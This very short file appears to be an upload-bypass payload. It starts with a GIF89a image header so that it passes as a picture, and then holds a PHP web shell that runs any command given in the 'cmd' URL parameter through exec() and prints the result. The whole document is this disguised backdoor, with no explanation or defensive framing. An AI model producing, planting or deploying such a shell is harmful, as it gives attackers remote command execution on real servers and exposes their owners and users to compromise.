GIF89a;
<?php
    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        echo exec($cmd);
    }
    else echo "No command";
?>